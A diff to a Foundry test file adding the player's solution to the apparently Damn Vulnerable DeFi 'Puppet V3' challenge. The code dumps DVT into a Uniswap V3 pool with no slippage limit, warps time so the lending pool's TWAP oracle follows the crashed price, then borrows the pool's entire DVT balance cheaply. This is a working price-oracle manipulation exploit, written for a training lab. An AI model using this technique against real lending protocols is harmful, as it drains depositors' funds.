@@ -5,11 +5,14 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +122,101 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        console.log("--- Inside test_puppetV3 ---");
+        IUniswapV3Pool currentUniswapPool = lendingPool.uniswapV3Pool();
+        (uint160 sqrtPriceX96Slot0Test,,,,,,) = currentUniswapPool.slot0();
+        console.log("Current sqrtPriceX96 from slot0 (in test_puppetV3):", sqrtPriceX96Slot0Test);
+
+        uint256 s_uint256_test = uint256(sqrtPriceX96Slot0Test);
+        uint256 sqrt_P_ratio_x1e18_test = (s_uint256_test * 1e18) / (uint256(1) << 96);
+        uint256 dvt_for_1_weth_test = (sqrt_P_ratio_x1e18_test * sqrt_P_ratio_x1e18_test) / 1e18;
+        console.log("DVT for 1 WETH (scaled by 1e18) (in test_puppetV3):", dvt_for_1_weth_test);
+
+        console.log("----------------------------");
+        console.log("Player token balance:", token.balanceOf(player));
+        console.log("Player WETH balance:", weth.balanceOf(player));
+        console.log("Player ETH balance:", player.balance);
+        console.log("----------------------------");
+
+        // Log calculateDepositOfWETHRequired before swap
+        uint256 wethRequiredBeforeSwap = lendingPool.calculateDepositOfWETHRequired(1e18); // for 1 DVT
+        console.log("WETH required for 1 DVT (before swap):", wethRequiredBeforeSwap);
+        console.log("----------------------------");
+
+        // Define SwapRouter
+        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+        // Approve DVT for SwapRouter
+        uint256 amountToSwap = token.balanceOf(player);
+        token.approve(address(swapRouter), amountToSwap);
+
+        // Perform the swap: DVT for WETH
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: player,
+            deadline: block.timestamp,
+            amountIn: amountToSwap,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        });
+
+        swapRouter.exactInputSingle(params);
+
+        console.log("--- After swap ---");
+        console.log("Player token balance:", token.balanceOf(player));
+        console.log("Player WETH balance:", weth.balanceOf(player));
+        (sqrtPriceX96Slot0Test,,,,,,) = currentUniswapPool.slot0();
+        console.log("New sqrtPriceX96 from slot0:", sqrtPriceX96Slot0Test);
+        s_uint256_test = uint256(sqrtPriceX96Slot0Test);
+        sqrt_P_ratio_x1e18_test = (s_uint256_test * 1e18) / (uint256(1) << 96);
+        dvt_for_1_weth_test = (sqrt_P_ratio_x1e18_test * sqrt_P_ratio_x1e18_test) / 1e18;
+        console.log("New DVT for 1 WETH (scaled by 1e18):", dvt_for_1_weth_test);
         
+        // Log calculateDepositOfWETHRequired immediately after swap (oracle not yet updated for TWAP)
+        uint256 wethRequiredPostSwapImmediate = lendingPool.calculateDepositOfWETHRequired(1e18);
+        console.log("WETH required for 1 DVT (after swap, pre-TWAP update):", wethRequiredPostSwapImmediate);
+
+        // Advance as long as we can to update
+        vm.warp(block.timestamp + 114);
+
+        // Log calculateDepositOfWETHRequired after swap and TWAP update
+        uint256 wethRequiredAfterSwapAndTwap = lendingPool.calculateDepositOfWETHRequired(1e18);
+        console.log("WETH required for 1 DVT (after swap, post-TWAP update):", wethRequiredAfterSwapAndTwap);
+        console.log("----------------------------");
+
+        // Calculate WETH needed to borrow all DVT from the lending pool
+        uint256 dvtInLendingPool = token.balanceOf(address(lendingPool)); // This is LENDING_POOL_INITIAL_TOKEN_BALANCE
+        console.log("DVT in lending pool to borrow:", dvtInLendingPool);
+        uint256 wethToBorrowAllDvt = lendingPool.calculateDepositOfWETHRequired(dvtInLendingPool);
+        console.log("WETH required to borrow all DVT from lending pool:", wethToBorrowAllDvt);
+        
+        uint256 playerWethBalance = weth.balanceOf(player);
+        console.log("Player WETH balance (before borrow):", playerWethBalance);
+        console.log("----------------------------");
+
+        // Player borrows all DVT from the lending pool
+        if (playerWethBalance >= wethToBorrowAllDvt) {
+            console.log("Player has enough WETH to borrow all DVT.");
+            // Approve lendingPool to spend player's WETH
+            weth.approve(address(lendingPool), wethToBorrowAllDvt);
+            
+            // Borrow DVT
+            console.log("Attempting to borrow", dvtInLendingPool, "DVT...");
+            lendingPool.borrow(dvtInLendingPool);
+            
+            console.log("--- After borrowing DVT ---");
+            console.log("Player DVT balance:", token.balanceOf(player));
+            console.log("Player WETH balance:", weth.balanceOf(player));
+            console.log("Lending Pool DVT balance:", token.balanceOf(address(lendingPool)));
+            console.log("----------------------------");
+            token.transfer(recovery, dvtInLendingPool);
+        } else {
+            console.log("Player does NOT have enough WETH to borrow all DVT.");
+            console.log("Needed:", wethToBorrowAllDvt, "Has:", playerWethBalance);
+            console.log("----------------------------");
+        }
     }
 
     /**
